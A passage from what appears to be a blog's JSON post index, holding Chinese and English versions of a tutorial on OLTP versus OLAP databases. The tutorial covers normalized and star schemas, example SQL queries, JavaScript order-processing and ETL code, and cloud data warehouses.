}, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"OLTP\", \"OLAP\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"简单查询\", \"联结查询\", \"聚合\", \"复杂分析\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"响应时间 (ms)\", \"axisLabel\": { \"formatter\": \"{value}\" } }, \"series\": [ { \"name\": \"OLTP\", \"type\": \"bar\", \"data\": [5, 20, 50, 200], \"itemStyle\": { \"color\": \"#1976d2\" } }, { \"name\": \"OLAP\", \"type\": \"bar\", \"data\": [100, 500, 2000, 10000], \"itemStyle\": { \"color\": \"#7b1fa2\" } } ] }; chart.setOption(option); } })(); 方面 OLTP OLAP 目的 日常运营 商业智能 用户 数千个并发用户 数十个分析师 操作 INSERT、UPDATE、DELETE、SELECT SELECT 搭配复杂聚合 查询复杂度 简单、预定义 复杂、临时 响应时间 毫秒 秒到分钟 每次查询的数据量 少数行 数百万行 数据库设计 规范化（3NF） 反规范化（星型/雪花） 数据新鲜度 实时 定期更新 事务支持 需要 ACID 不重要 索引 多个字段上的多个索引 关键字段上的少数索引 示例系统 MySQL、PostgreSQL、Oracle Redshift、BigQuery、Snowflake 真实世界示例：电子商务平台 OLTP：处理订单 class OrderProcessingService &#123; async processCheckout(cart, customerId) &#123; &#x2F;&#x2F; OLTP：快速交易处理 const connection &#x3D; await this.db.getConnection(); try &#123; await connection.beginTransaction(); &#x2F;&#x2F; 创建订单（影响 1 行） const order &#x3D; await connection.query( &#39;INSERT INTO orders (customer_id, total, status) VALUES (?, ?, ?)&#39;, [customerId, cart.total, &#39;PROCESSING&#39;] ); &#x2F;&#x2F; 添加订单项目（影响少数行） for (const item of cart.items) &#123; await connection.query( &#39;INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (?, ?, ?, ?)&#39;, [order.id, item.id, item.quantity, item.price] ); &#x2F;&#x2F; 更新库存（影响 1 行） await connection.query( &#39;UPDATE products SET stock &#x3D; stock - ? WHERE id &#x3D; ?&#39;, [item.quantity, item.id] ); &#125; &#x2F;&#x2F; 记录付款（影响 1 行） await connection.query( &#39;INSERT INTO payments (order_id, amount, method, status) VALUES (?, ?, ?, ?)&#39;, [order.id, cart.total, cart.paymentMethod, &#39;COMPLETED&#39;] ); await connection.commit(); &#x2F;&#x2F; 毫秒级响应 return &#123; orderId: order.id, status: &#39;SUCCESS&#39; &#125;; &#125; catch (error) &#123; await connection.rollback(); throw error; &#125; &#125; &#125; OLAP：分析销售绩效 class SalesReportingService &#123; async generateQuarterlyReport(year, quarter) &#123; &#x2F;&#x2F; OLAP：复杂的分析查询 const query &#x3D; &#96; SELECT d.month_name, p.category, s.region, COUNT(DISTINCT f.sale_id) as transaction_count, COUNT(DISTINCT f.customer_key) as unique_customers, SUM(f.quantity) as units_sold, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit, AVG(f.revenue) as avg_transaction_value, SUM(f.profit) &#x2F; SUM(f.revenue) * 100 as profit_margin FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_store s ON f.store_key &#x3D; s.store_key WHERE d.year &#x3D; ? AND d.quarter &#x3D; ? GROUP BY d.month_name, p.category, s.region WITH ROLLUP ORDER BY d.month_name, total_revenue DESC &#96;; &#x2F;&#x2F; 查询扫描数百万行 &#x2F;&#x2F; 秒级响应 const results &#x3D; await this.dataWarehouse.query(query, [year, quarter]); return this.formatReport(results); &#125; async getCustomerLifetimeValue() &#123; &#x2F;&#x2F; OLAP：客户分析 const query &#x3D; &#96; SELECT c.segment, c.region, COUNT(DISTINCT c.customer_key) as customer_count, AVG(customer_metrics.total_revenue) as avg_lifetime_value, AVG(customer_metrics.order_count) as avg_orders, AVG(customer_metrics.avg_order_value) as avg_order_size, AVG(customer_metrics.customer_age_days) as avg_customer_age_days FROM dim_customer c JOIN ( SELECT f.customer_key, SUM(f.revenue) as total_revenue, COUNT(DISTINCT f.sale_id) as order_count, AVG(f.revenue) as avg_order_value, DATEDIFF(CURRENT_DATE, MIN(d.full_date)) as customer_age_days FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key GROUP BY f.customer_key ) customer_metrics ON c.customer_key &#x3D; customer_metrics.customer_key GROUP BY c.segment, c.region ORDER BY avg_lifetime_value DESC &#96;; return await this.dataWarehouse.query(query); &#125; &#125; ETL：连接 OLTP 和 OLAP 提取、转换、加载（ETL）流程将数据从 OLTP 系统移动到 OLAP 系统： class ETLPipeline &#123; async runDailySalesETL() &#123; console.log(&#39;开始 ETL 流程...&#39;); &#x2F;&#x2F; 提取：从 OLTP 数据库获取数据 const salesData &#x3D; await this.extractSalesData(); &#x2F;&#x2F; 转换：清理和重塑数据 const transformedData &#x3D; await this.transformSalesData(salesData); &#x2F;&#x2F; 加载：插入到数据仓库 await this.loadToDataWarehouse(transformedData); console.log(&#39;ETL 流程完成&#39;); &#125; async extractSalesData() &#123; &#x2F;&#x2F; 从 OLTP 数据库提取 const query &#x3D; &#96; SELECT o.id as order_id, o.created_at, o.customer_id, c.name as customer_name, c.region, oi.product_id, p.name as product_name, p.category, oi.quantity, oi.price, oi.quantity * oi.price as revenue FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id JOIN order_items oi ON o.id &#x3D; oi.order_id JOIN products p ON oi.product_id &#x3D; p.id WHERE DATE(o.created_at) &#x3D; CURRENT_DATE - INTERVAL 1 DAY &#96;; return await this.oltpDb.query(query); &#125; async transformSalesData(salesData) &#123; &#x2F;&#x2F; 转换数据以供分析 return salesData.map(row &#x3D;&gt; (&#123; sale_id: row.order_id, date_key: this.getDateKey(row.created_at), customer_key: this.getCustomerKey(row.customer_id), product_key: this.getProductKey(row.product_id), quantity: row.quantity, unit_price: row.price, revenue: row.revenue, cost: row.revenue * 0.6, &#x2F;&#x2F; 简化的成本计算 profit: row.revenue * 0.4 &#125;)); &#125; async loadToDataWarehouse(data) &#123; &#x2F;&#x2F; 批量插入到 OLAP 数据库 const batchSize &#x3D; 1000; for (let i &#x3D; 0; i &lt; data.length; i +&#x3D; batchSize) &#123; const batch &#x3D; data.slice(i, i + batchSize); await this.dataWarehouse.batchInsert(&#39;fact_sales&#39;, batch); &#125; &#125; getDateKey(date) &#123; &#x2F;&#x2F; 将日期转换为整数键：YYYYMMDD return parseInt(date.toISOString().slice(0, 10).replace(&#x2F;-&#x2F;g, &#39;&#39;)); &#125; getCustomerKey(customerId) &#123; &#x2F;&#x2F; 将 OLTP 客户 ID 映射到 OLAP 客户键 return this.customerKeyMap.get(customerId); &#125; getProductKey(productId) &#123; &#x2F;&#x2F; 将 OLTP 产品 ID 映射到 OLAP 产品键 return this.productKeyMap.get(productId); &#125; &#125; 选择正确的系统 使用 OLTP 的时机： ✅ 高交易量：数千个并发用户 ✅ 数据完整性至关重要：金融交易、库存管理 ✅ 实时更新：当前数据必须立即可用 ✅ 简单查询：按 ID 查询、插入、更新、删除 ✅ 需要 ACID 合规性：银行、电子商务、订位系统 使用 OLAP 的时机： ✅ 复杂分析：多维度分析、聚合 ✅ 历史分析：趋势分析、预测 ✅ 大数据量：分析数百万或数十亿行 ✅ 商业智能：报表、仪表板、数据挖掘 ✅ 读取密集工作负载：少量写入、大量复杂读取 混合方法：HTAP 某些现代数据库支持混合交易/分析处理（HTAP）： &#x2F;&#x2F; 示例：使用读取副本进行分析 class HybridDataAccess &#123; constructor() &#123; this.primaryDb &#x3D; new Database(&#39;primary&#39;); &#x2F;&#x2F; OLTP this.replicaDb &#x3D; new Database(&#39;replica&#39;); &#x2F;&#x2F; OLAP 查询 &#125; &#x2F;&#x2F; 写入操作到主数据库 async createOrder(orderData) &#123; return await this.primaryDb.insert(&#39;orders&#39;, orderData); &#125; &#x2F;&#x2F; 简单读取从主数据库 async getOrder(orderId) &#123; return await this.primaryDb.query( &#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId] ); &#125; &#x2F;&#x2F; 复杂分析从副本 async getSalesReport(startDate, endDate) &#123; return await this.replicaDb.query(&#96; SELECT DATE(created_at) as date, COUNT(*) as order_count, SUM(total) as revenue FROM orders WHERE created_at BETWEEN ? AND ? GROUP BY DATE(created_at) &#96;, [startDate, endDate]); &#125; &#125; 现代 OLAP 技术 云端数据仓库 &#x2F;&#x2F; 示例：使用 Amazon Redshift class RedshiftAnalytics &#123; async runAnalysis() &#123; const query &#x3D; &#96; SELECT date_trunc(&#39;month&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(DISTINCT customer_id) as unique_customers FROM sales_fact WHERE sale_date &gt;&#x3D; &#39;2020-01-01&#39; GROUP BY 1, 2 ORDER BY 1, 3 DESC &#96;; return await this.redshift.query(query); &#125; &#125; &#x2F;&#x2F; 示例：使用 Google BigQuery class BigQueryAnalytics &#123; async runAnalysis() &#123; const query &#x3D; &#96; SELECT FORMAT_DATE(&#39;%Y-%m&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(DISTINCT customer_id) as unique_customers FROM \\&#96;project.dataset.sales_fact\\&#96; WHERE sale_date &gt;&#x3D; &#39;2020-01-01&#39; GROUP BY month, product_category ORDER BY month, total_revenue DESC &#96;; return await this.bigquery.query(query); &#125; &#125; 性能优化 OLTP 优化 -- 快速查询的索引 CREATE INDEX idx_orders_customer ON orders(customer_id); CREATE INDEX idx_orders_status ON orders(status); CREATE INDEX idx_orders_created ON orders(created_at); -- 大型数据表的分区 CREATE TABLE orders ( id INT, customer_id INT, created_at TIMESTAMP, ... ) PARTITION BY RANGE (YEAR(created_at)) ( PARTITION p2019 VALUES LESS THAN (2020), PARTITION p2020 VALUES LESS THAN (2021), PARTITION p2021 VALUES LESS THAN (2022) ); OLAP 优化 -- 分析用的列式存储 CREATE TABLE fact_sales ( sale_id BIGINT, date_key INT, customer_key INT, revenue DECIMAL(10,2), ... ) STORED AS PARQUET; -- 常见查询的物化视图 CREATE MATERIALIZED VIEW monthly_sales_summary AS SELECT DATE_TRUNC(&#39;month&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(*) as transaction_count FROM fact_sales GROUP BY 1, 2; -- 定期刷新 REFRESH MATERIALIZED VIEW monthly_sales_summary; 总结 理解 OLTP 和 OLAP 是设计有效数据系统的基础： OLTP 系统： 通过快速、可靠的交易为日常运营提供动力 针对写入和简单读取优化 规范化架构确保数据完整性 实时、当前数据 OLAP 系统： 启用商业智能和分析 针对大型数据集上的复杂查询优化 反规范化架构改善查询性能 用于趋势分析的历史数据 关键要点：大多数组织两者都需要——OLTP 用于运营，OLAP 用于分析。ETL 流程连接两者，将数据从交易系统移动到分析仓库，在那里可以进行分析而不影响运营性能。 💡 最佳实践永远不要直接在 OLTP 数据库上执行复杂的分析查询。使用 ETL 将数据移动到专用的 OLAP 系统，保护您的运营数据库免受性能下降的影响。 参考资料 The Data Warehouse Toolkit by Ralph Kimball AWS: OLTP vs OLAP Google Cloud: Data Warehouse Concepts","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"OLTP vs OLAP: Understanding Transaction and Analytics Databases","slug":"2020/02/OLTP-vs-OLAP","date":"un55fin55","updated":"un55fin55","comments":true,"path":"2020/02/OLTP-vs-OLAP/","permalink":"https://neo01.com/2020/02/OLTP-vs-OLAP/","excerpt":"Discover the fundamental differences between OLTP and OLAP systems. Learn when to use transaction databases for daily operations and analytics databases for business intelligence.","text":"Imagine two different types of stores. The first is a busy convenience store where customers quickly grab items, pay, and leave—hundreds of small, fast transactions every hour. The second is a warehouse where analysts study purchasing patterns, inventory trends, and seasonal demands—fewer operations, but each one examines massive amounts of data. These represent the two fundamental approaches to database systems: OLTP and OLAP. The Two Worlds of Data Processing Modern businesses need databases for two distinct purposes: OLTP (Online Transaction Processing): Handles day-to-day operations Process customer orders Update inventory Record payments Manage user accounts OLAP (Online Analytical Processing): Supports business intelligence Analyze sales trends Generate reports Forecast demand Identify patterns graph TB subgraph OLTP[\"🏪 OLTP System\"] T1[Customer Order] T2[Payment Processing] T3[Inventory Update] T4[User Registration] T1 --> DB1[(TransactionDatabase)] T2 --> DB1 T3 --> DB1 T4 --> DB1 end subgraph ETL[\"🔄 ETL Process\"] E1[Extract] E2[Transform] E3[Load] E1 --> E2 E2 --> E3 end subgraph OLAP[\"📊 OLAP System\"] A1[Sales Analysis] A2[Trend Reports] A3[Forecasting] A4[Business Intelligence] DW[(DataWarehouse)] --> A1 DW --> A2 DW --> A3 DW --> A4 end DB1 -.->|Periodic Sync| E1 E3 --> DW style OLTP fill:#e3f2fd,stroke:#1976d2 style OLAP fill:#f3e5f5,stroke:#7b1fa2 style ETL fill:#fff3e0,stroke:#f57c00 OLTP: The Operational Workhorse OLTP systems power your daily business operations with fast, reliable transactions. Characteristics &#x2F;&#x2F; OLTP: Fast, focused operations class OrderService &#123; async createOrder(customerId, items) &#123; &#x2F;&#x2F; Single transaction affecting few rows const connection &#x3D; await db.getConnection(); try &#123; await connection.beginTransaction(); &#x2F;&#x2F; Insert order (1 row) const order &#x3D; await connection.query( &#39;INSERT INTO orders (customer_id, total, status) VALUES (?, ?, ?)&#39;, [customerId, this.calculateTotal(items), &#39;PENDING&#39;] ); &#x2F;&#x2F; Insert order items (few rows) for (const item of items) &#123; await connection.query( &#39;INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (?, ?, ?, ?)&#39;, [order.id, item.productId, item.quantity, item.price] ); &#x2F;&#x2F; Update inventory (1 row per item) await connection.query( &#39;UPDATE products SET stock &#x3D; stock - ? WHERE id &#x3D; ?&#39;, [item.quantity, item.productId] ); &#125; await connection.commit(); return order; &#125; catch (error) &#123; await connection.rollback(); throw error; &#125; &#125; &#125; OLTP Database Design: Normalized Schema -- Normalized design minimizes redundancy -- Optimized for INSERT, UPDATE, DELETE CREATE TABLE customers ( id INT PRIMARY KEY, name VARCHAR(100), email VARCHAR(100), created_at TIMESTAMP ); CREATE TABLE orders ( id INT PRIMARY KEY, customer_id INT, total DECIMAL(10,2), status VARCHAR(20), created_at TIMESTAMP, FOREIGN KEY (customer_id) REFERENCES customers(id) ); CREATE TABLE order_items ( id INT PRIMARY KEY, order_id INT, product_id INT, quantity INT, price DECIMAL(10,2), FOREIGN KEY (order_id) REFERENCES orders(id), FOREIGN KEY (product_id) REFERENCES products(id) ); CREATE TABLE products ( id INT PRIMARY KEY, name VARCHAR(200), category_id INT, stock INT, price DECIMAL(10,2) ); OLTP Query Patterns -- Typical OLTP queries: Fast, specific, small result sets -- Get customer details SELECT * FROM customers WHERE id &#x3D; 12345; -- Create new order INSERT INTO orders (customer_id, total, status, created_at) VALUES (12345, 299.99, &#39;PENDING&#39;, NOW()); -- Update inventory UPDATE products SET stock &#x3D; stock - 2 WHERE id &#x3D; 789; -- Check order status SELECT o.id, o.status, o.total, c.name FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id WHERE o.id &#x3D; 54321; 💡 OLTP Key FeaturesFast response time: Milliseconds per transaction High concurrency: Thousands of simultaneous users ACID compliance: Guaranteed data consistency Normalized schema: Minimal data redundancy Current data: Real-time, up-to-date information OLAP: The Analytics Powerhouse OLAP systems analyze historical data to support business decisions. Characteristics &#x2F;&#x2F; OLAP: Complex analysis across large datasets class SalesAnalytics &#123; async getMonthlySalesTrend(year) &#123; &#x2F;&#x2F; Query scans millions of rows &#x2F;&#x2F; Aggregates data across multiple dimensions const query &#x3D; &#96; SELECT DATE_FORMAT(o.created_at, &#39;%Y-%m&#39;) as month, c.region, p.category, COUNT(DISTINCT o.id) as order_count, SUM(oi.quantity) as units_sold, SUM(oi.quantity * oi.price) as revenue, AVG(o.total) as avg_order_value FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id JOIN order_items oi ON o.id &#x3D; oi.order_id JOIN products p ON oi.product_id &#x3D; p.id WHERE YEAR(o.created_at) &#x3D; ? GROUP BY DATE_FORMAT(o.created_at, &#39;%Y-%m&#39;), c.region, p.category ORDER BY month, region, category &#96;; return await dataWarehouse.query(query, [year]); &#125; async getCustomerSegmentation() &#123; &#x2F;&#x2F; Complex analytical query const query &#x3D; &#96; SELECT CASE WHEN total_spent &gt; 10000 THEN &#39;VIP&#39; WHEN total_spent &gt; 5000 THEN &#39;Premium&#39; WHEN total_spent &gt; 1000 THEN &#39;Regular&#39; ELSE &#39;Occasional&#39; END as segment, COUNT(*) as customer_count, AVG(total_spent) as avg_lifetime_value, AVG(order_count) as avg_orders, AVG(days_since_first_order) as avg_customer_age FROM ( SELECT c.id, SUM(o.total) as total_spent, COUNT(o.id) as order_count, DATEDIFF(NOW(), MIN(o.created_at)) as days_since_first_order FROM customers c LEFT JOIN orders o ON c.id &#x3D; o.customer_id GROUP BY c.id ) customer_stats GROUP BY segment ORDER BY avg_lifetime_value DESC &#96;; return await dataWarehouse.query(query); &#125; &#125; OLAP Database Design: Star Schema -- Denormalized design optimized for queries -- Star schema with fact and dimension tables -- Fact table: Contains metrics CREATE TABLE fact_sales ( sale_id BIGINT PRIMARY KEY, date_key INT, customer_key INT, product_key INT, store_key INT, quantity INT, unit_price DECIMAL(10,2), discount DECIMAL(10,2), revenue DECIMAL(10,2), cost DECIMAL(10,2), profit DECIMAL(10,2), FOREIGN KEY (date_key) REFERENCES dim_date(date_key), FOREIGN KEY (customer_key) REFERENCES dim_customer(customer_key), FOREIGN KEY (product_key) REFERENCES dim_product(product_key), FOREIGN KEY (store_key) REFERENCES dim_store(store_key) ); -- Dimension tables: Contain descriptive attributes CREATE TABLE dim_date ( date_key INT PRIMARY KEY, full_date DATE, year INT, quarter INT, month INT, month_name VARCHAR(20), week INT, day_of_week INT, day_name VARCHAR(20), is_weekend BOOLEAN, is_holiday BOOLEAN ); CREATE TABLE dim_customer ( customer_key INT PRIMARY KEY, customer_id INT, name VARCHAR(100), email VARCHAR(100), segment VARCHAR(50), region VARCHAR(50), country VARCHAR(50), registration_date DATE ); CREATE TABLE dim_product ( product_key INT PRIMARY KEY, product_id INT, name VARCHAR(200), category VARCHAR(100), subcategory VARCHAR(100), brand VARCHAR(100), supplier VARCHAR(100) ); CREATE TABLE dim_store ( store_key INT PRIMARY KEY, store_id INT, name VARCHAR(100), city VARCHAR(100), state VARCHAR(100), country VARCHAR(100), region VARCHAR(50), size_category VARCHAR(20) ); graph TB F[Fact Tablefact_salessale_id, quantity, revenue, profit] D1[Dimensiondim_dateyear, quarter, month, week] D2[Dimensiondim_customername, segment, region] D3[Dimensiondim_productcategory, brand, supplier] D4[Dimensiondim_storecity, state, region] F --> D1 F --> D2 F --> D3 F --> D4 style F fill:#ffeb3b,stroke:#f57f17 style D1 fill:#81c784,stroke:#388e3c style D2 fill:#81c784,stroke:#388e3c style D3 fill:#81c784,stroke:#388e3c style D4 fill:#81c784,stroke:#388e3c OLAP Query Patterns -- Typical OLAP queries: Complex, analytical, large result sets -- Sales trend analysis SELECT d.year, d.quarter, p.category, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit, COUNT(DISTINCT f.customer_key) as unique_customers FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key WHERE d.year BETWEEN 2018 AND 2020 GROUP BY d.year, d.quarter, p.category ORDER BY d.year, d.quarter, total_revenue DESC; -- Customer segmentation by region SELECT c.region, c.segment, COUNT(DISTINCT f.customer_key) as customer_count, SUM(f.revenue) as total_revenue, AVG(f.revenue) as avg_transaction_value FROM fact_sales f JOIN dim_customer c ON f.customer_key &#x3D; c.customer_key JOIN dim_date d ON f.date_key &#x3D; d.date_key WHERE d.year &#x3D; 2020 GROUP BY c.region, c.segment ORDER BY total_revenue DESC; -- Product performance comparison SELECT p.category, p.brand, SUM(f.quantity) as units_sold, SUM(f.revenue) as revenue, SUM(f.profit) as profit, SUM(f.profit) &#x2F; SUM(f.revenue) * 100 as profit_margin FROM fact_sales f JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_date d ON f.date_key &#x3D; d.date_key WHERE d.year &#x3D; 2020 GROUP BY p.category, p.brand HAVING SUM(f.revenue) &gt; 100000 ORDER BY profit_margin DESC; 💡 OLAP Key FeaturesComplex queries: Multi-dimensional analysis Large data volumes: Millions to billions of rows Historical data: Time-series analysis Denormalized schema: Optimized for read performance Batch updates: Periodic data loads (ETL) Side-by-Side Comparison (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_508089848')); var option = { \"title\": { \"text\": \"OLTP vs OLAP: Query Response Time\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"OLTP\", \"OLAP\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"Simple Query\", \"Join Query\", \"Aggregation\", \"Complex Analysis\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Response Time (ms)\", \"axisLabel\": { \"formatter\": \"{value}\" } }, \"series\": [ { \"name\": \"OLTP\", \"type\": \"bar\", \"data\": [5, 20, 50, 200], \"itemStyle\": { \"color\": \"#1976d2\" } }, { \"name\": \"OLAP\", \"type\": \"bar\", \"data\": [100, 500, 2000, 10000], \"itemStyle\": { \"color\": \"#7b1fa2\" } } ] }; chart.setOption(option); } })(); Aspect OLTP OLAP Purpose Daily operations Business intelligence Users Thousands of concurrent users Dozens of analysts Operations INSERT, UPDATE, DELETE, SELECT SELECT with complex aggregations Query complexity Simple, predefined Complex, ad-hoc Response time Milliseconds Seconds to minutes Data volume per query Few rows Millions of rows Database design Normalized (3NF) Denormalized (star/snowflake) Data freshness Real-time Periodic updates Transaction support ACID required Not critical Indexing Many indexes on various columns Few indexes on key columns Example systems MySQL, PostgreSQL, Oracle Redshift, BigQuery, Snowflake Real-World Example: E-Commerce Platform OLTP: Processing Orders class OrderProcessingService &#123; async processCheckout(cart, customerId) &#123; &#x2F;&#x2F; OLTP: Fast transaction processing const connection &#x3D; await this.db.getConnection(); try &#123; await connection.beginTransaction(); &#x2F;&#x2F; Create order (affects 1 row) const order &#x3D; await connection.query( &#39;INSERT INTO orders (customer_id, total, status) VALUES (?, ?, ?)&#39;, [customerId, cart.total, &#39;PROCESSING&#39;] ); &#x2F;&#x2F; Add order items (affects few rows) for (const item of cart.items) &#123; await connection.query( &#39;INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (?, ?, ?, ?)&#39;, [order.id, item.id, item.quantity, item.price] ); &#x2F;&#x2F; Update inventory (affects 1 row) await connection.query( &#39;UPDATE products SET stock &#x3D; stock - ? WHERE id &#x3D; ?&#39;, [item.quantity, item.id] ); &#125; &#x2F;&#x2F; Record payment (affects 1 row) await connection.query( &#39;INSERT INTO payments (order_id, amount, method, status) VALUES (?, ?, ?, ?)&#39;, [order.id, cart.total, cart.paymentMethod, &#39;COMPLETED&#39;] ); await connection.commit(); &#x2F;&#x2F; Response in milliseconds return &#123; orderId: order.id, status: &#39;SUCCESS&#39; &#125;; &#125; catch (error) &#123; await connection.rollback(); throw error; &#125; &#125; &#125; OLAP: Analyzing Sales Performance class SalesReportingService &#123; async generateQuarterlyReport(year, quarter) &#123; &#x2F;&#x2F; OLAP: Complex analytical query const query &#x3D; &#96; SELECT d.month_name, p.category, s.region, COUNT(DISTINCT f.sale_id) as transaction_count, COUNT(DISTINCT f.customer_key) as unique_customers, SUM(f.quantity) as units_sold, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit, AVG(f.revenue) as avg_transaction_value, SUM(f.profit) &#x2F; SUM(f.revenue) * 100 as profit_margin FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_store s ON f.store_key &#x3D; s.store_key WHERE d.year &#x3D; ? AND d.quarter &#x3D; ? GROUP BY d.month_name, p.category, s.region WITH ROLLUP ORDER BY d.month_name, total_revenue DESC &#96;; &#x2F;&#x2F; Query scans millions of rows &#x2F;&#x2F; Response in seconds const results &#x3D; await this.dataWarehouse.query(query, [year, quarter]); return this.formatReport(results); &#125; async getCustomerLifetimeValue() &#123; &#x2F;&#x2F; OLAP: Customer analytics const query &#x3D; &#96; SELECT c.segment, c.region, COUNT(DISTINCT c.customer_key) as customer_count, AVG(customer_metrics.total_revenue) as avg_lifetime_value, AVG(customer_metrics.order_count) as avg_orders, AVG(customer_metrics.avg_order_value) as avg_order_size, AVG(customer_metrics.customer_age_days) as avg_customer_age_days FROM dim_customer c JOIN ( SELECT f.customer_key, SUM(f.revenue) as total_revenue, COUNT(DISTINCT f.sale_id) as order_count, AVG(f.revenue) as avg_order_value, DATEDIFF(CURRENT_DATE, MIN(d.full_date)) as customer_age_days FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key GROUP BY f.customer_key ) customer_metrics ON c.customer_key &#x3D; customer_metrics.customer_key GROUP BY c.segment, c.region ORDER BY avg_lifetime_value DESC &#96;; return await this.dataWarehouse.query(query); &#125; &#125; ETL: Bridging OLTP and OLAP Extract, Transform, Load (ETL) processes move data from OLTP to OLAP systems: class ETLPipeline &#123; async runDailySalesETL() &#123; console.log(&#39;Starting ETL process...&#39;); &#x2F;&#x2F; Extract: Get data from OLTP database const salesData &#x3D; await this.extractSalesData(); &#x2F;&#x2F; Transform: Clean and reshape data const transformedData &#x3D; await this.transformSalesData(salesData); &#x2F;&#x2F; Load: Insert into data warehouse await this.loadToDataWarehouse(transformedData); console.log(&#39;ETL process completed&#39;); &#125; async extractSalesData() &#123; &#x2F;&#x2F; Extract from OLTP database const query &#x3D; &#96; SELECT o.id as order_id, o.created_at, o.customer_id, c.name as customer_name, c.region, oi.product_id, p.name as product_name, p.category, oi.quantity, oi.price, oi.quantity * oi.price as revenue FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id JOIN order_items oi ON o.id &#x3D; oi.order_id JOIN products p ON oi.product_id &#x3D; p.id WHERE DATE(o.created_at) &#x3D; CURRENT_DATE - INTERVAL 1 DAY &#96;; return await this.oltpDb.query(query); &#125; async transformSalesData(salesData) &#123; &#x2F;&#x2F; Transform data for analytics return salesData.map(row &#x3D;&gt; (&#123; sale_id: row.order_id, date_key: this.getDateKey(row.created_at), customer_key: this.getCustomerKey(row.customer_id), product_key: this.getProductKey(row.product_id), quantity: row.quantity, unit_price: row.price, revenue: row.revenue, cost: row.revenue * 0.6, &#x2F;&#x2F; Simplified cost calculation profit: row.revenue * 0.4 &#125;)); &#125; async loadToDataWarehouse(data) &#123; &#x2F;&#x2F; Batch insert into OLAP database const batchSize &#x3D; 1000; for (let i &#x3D; 0; i &lt; data.length; i +&#x3D; batchSize) &#123; const batch &#x3D; data.slice(i, i + batchSize); await this.dataWarehouse.batchInsert(&#39;fact_sales&#39;, batch); &#125; &#125; getDateKey(date) &#123; &#x2F;&#x2F; Convert date to integer key: YYYYMMDD return parseInt(date.toISOString().slice(0, 10).replace(&#x2F;-&#x2F;g, &#39;&#39;)); &#125; getCustomerKey(customerId) &#123; &#x2F;&#x2F; Map OLTP customer ID to OLAP customer key return this.customerKeyMap.get(customerId); &#125; getProductKey(productId) &#123; &#x2F;&#x2F; Map OLTP product ID to OLAP product key return this.productKeyMap.get(productId); &#125; &#125; Choosing the Right System Use OLTP When: ✅ High transaction volume: Thousands of concurrent users ✅ Data integrity critical: Financial transactions, inventory management ✅ Real-time updates: Current data must be immediately available ✅ Simple queries: Lookup by ID, insert, update, delete ✅ ACID compliance required: Banking, e-commerce, booking systems Use OLAP When: ✅ Complex analytics: Multi-dimensional analysis, aggregations ✅ Historical analysis: Trend analysis, forecasting ✅ Large data volumes: Analyzing millions or billions of rows ✅ Business intelligence: Reports, dashboards, data mining ✅ Read-heavy workload: Few writes, many complex reads Hybrid Approach: HTAP Some modern databases support Hybrid Transaction/Analytical Processing (HTAP): &#x2F;&#x2F; Example: Using read replicas for analytics class HybridDataAccess &#123; constructor() &#123; this.primaryDb &#x3D; new Database(&#39;primary&#39;); &#x2F;&#x2F; OLTP this.replicaDb &#x3D; new Database(&#39;replica&#39;); &#x2F;&#x2F; OLAP queries &#125; &#x2F;&#x2F; Write operations go to primary async createOrder(orderData) &#123; return await this.primaryDb.insert(&#39;orders&#39;, orderData); &#125; &#x2F;&#x2F; Simple reads from primary async getOrder(orderId) &#123; return await this.primaryDb.query( &#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId] ); &#125; &#x2F;&#x2F; Complex analytics from replica async getSalesReport(startDate, endDate) &#123; return await this.replicaDb.query(&#96; SELECT DATE(created_at) as date, COUNT(*) as order_count, SUM(total) as revenue FROM orders WHERE created_at BETWEEN ? AND ? GROUP BY DATE(created_at) &#96;, [startDate, endDate]); &#125; &#125; Modern OLAP Technologies Cloud Data Warehouses &#x2F;&#x2F; Example: Using Amazon Redshift class RedshiftAnalytics &#123; async runAnalysis() &#123; const query &#x3D; &#96; SELECT date_trunc(&#39;month&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(DISTINCT customer_id) as unique_customers FROM sales_fact WHERE sale_date &gt;&#x3D; &#39;2020-01-01&#39; GROUP BY 1, 2 ORDER BY 1, 3 DESC &#96;; return await this.redshift.query(query); &#125; &#125; &#x2F;&#x2F; Example: Using Google BigQuery class BigQueryAnalytics &#123; async runAnalysis() &#123; const query &#x3D; &#96; SELECT FORMAT_DATE(&#39;%Y-%m&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(DISTINCT customer_id) as unique_customers FROM \\&#96;project.dataset.sales_fact\\&#96; WHERE sale_date &gt;&#x3D; &#39;2020-01-01&#39; GROUP BY month, product_category ORDER BY month, total_revenue DESC &#96;; return await 